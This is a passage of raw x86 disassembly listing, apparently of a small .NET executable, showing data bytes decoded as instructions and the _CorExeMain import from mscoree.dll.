  40d0c6:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d0cc:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d0d1:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d0d7:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d0dd:	12 60 1d             	adc    0x1d(%eax),%ah
  40d0e0:	0e                   	push   %cs
  40d0e1:	0e                   	push   %cs
  40d0e2:	08 12                	or     %dl,(%edx)
  40d0e4:	60                   	pusha
  40d0e5:	08 05 07 01 12 81    	or     %al,0x81120107
  40d0eb:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d0f0:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d0f7:	05 08 08 06 00       	add    $0x60808,%eax
  40d0fc:	02 07                	add    (%edi),%al
  40d0fe:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d103:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d10a:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d110:	00 02                	add    %al,(%edx)
  40d112:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d118:	02 0b                	add    (%ebx),%cl
  40d11a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d11f:	02 06                	add    (%esi),%al
  40d121:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d126:	02 0a                	add    (%edx),%cl
  40d128:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d12d:	03 12                	add    (%edx),%edx
  40d12f:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d136:	07 02 12 
  40d139:	60                   	pusha
  40d13a:	02 04 07             	add    (%edi,%eax,1),%al
  40d13d:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d143:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d148:	04 1d                	add    $0x1d,%al
  40d14a:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d14f:	06                   	push   %es
  40d150:	07                   	pop    %es
  40d151:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d157:	00 01                	add    %al,(%ecx)
  40d159:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d15e:	06                   	push   %es
  40d15f:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d165:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d16b:	05 08 20 02 01       	add    $0x1022008,%eax
  40d170:	12 61 11             	adc    0x11(%ecx),%ah
  40d173:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d177:	04 12                	add    $0x12,%al
  40d179:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d180:	1d 05 00 
  40d183:	00 ac d1 00 00 00 00 	add    %ch,0x0(%ecx,%edx,8)
  40d18a:	00 00                	add    %al,(%eax)
  40d18c:	00 00                	add    %al,(%eax)
  40d18e:	00 00                	add    %al,(%eax)
  40d190:	ce                   	into
  40d191:	d1 00                	roll   $1,(%eax)
  40d193:	00 00                	add    %al,(%eax)
  40d195:	20 00                	and    %al,(%eax)
	...
  40d1ab:	00 c0                	add    %al,%al
  40d1ad:	d1 00                	roll   $1,(%eax)
	...
  40d1bf:	00 00                	add    %al,(%eax)
  40d1c1:	00 5f 43             	add    %bl,0x43(%edi)
  40d1c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40d1c5:	72 45                	jb     0x40d20c
  40d1c7:	78 65                	js     0x40d22e
  40d1c9:	4d                   	dec    %ebp
  40d1ca:	61                   	popa
  40d1cb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d1d2:	72 65                	jb     0x40d239
  40d1d4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d1d8:	6c                   	insb   (%dx),%es:(%edi)
  40d1d9:	00 00                	add    %al,(%eax)
  40d1db:	00 00                	add    %al,(%eax)
  40d1dd:	00 ff                	add    %bh,%bh
  40d1df:	25 00 20 40 00       	and    $0x402000,%eax
